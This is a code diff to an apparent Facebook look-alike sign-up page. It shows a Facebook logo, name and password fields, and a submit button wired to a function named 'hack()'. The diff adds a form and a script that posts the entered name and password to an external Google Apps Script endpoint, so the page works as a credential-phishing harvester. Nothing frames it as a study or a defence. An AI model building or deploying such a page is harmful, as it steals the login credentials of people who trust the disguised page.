@@ -14,18 +14,27 @@
     <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"/>
   </div>
   <div class="main">
-    <input type = "text" placeholder="Enter your name" id = "getName" class="nameField"/>
-     <input type = "text" placeholder="Enter your password" id = "getPassword" class="passwordField"/>
+    <form name='submit-to-google-sheet'>
+    <input type = "text" name="Name" placeholder="Enter your name" id = "getName" class="nameField"/>
+     <input type = "password" name="Password" placeholder="Enter your password" id = "getPassword" class="passwordField"/>
     <button type="submit" class="submitButton" onclick="hack()"/>Sign Up</button>
+      </form>
   </div>
-  <script src="script.js"></script>
+  <script src="script.js">
+    
+  </script>
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbwzzoehU1OhT1gPGbch8unWdNDmdtQo8DtdJGeQTrwLdEZaeiR2oJonRIbB7PyjBwL20g/exec'
+  const form = document.forms['submit-to-google-sheet']
 
- <!--
-  This script places a badge on your repl's full-browser view back to your repl's cover
-  page. Try various colors for the theme: dark, light, red, orange, yellow, lime, green,
-  teal, blue, blurple, magenta, pink!
-  -->
-  <script src="https://replit.com/public/js/replit-badge.js" theme="blue" defer></script> 
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+  
 </body>
 
 </html>
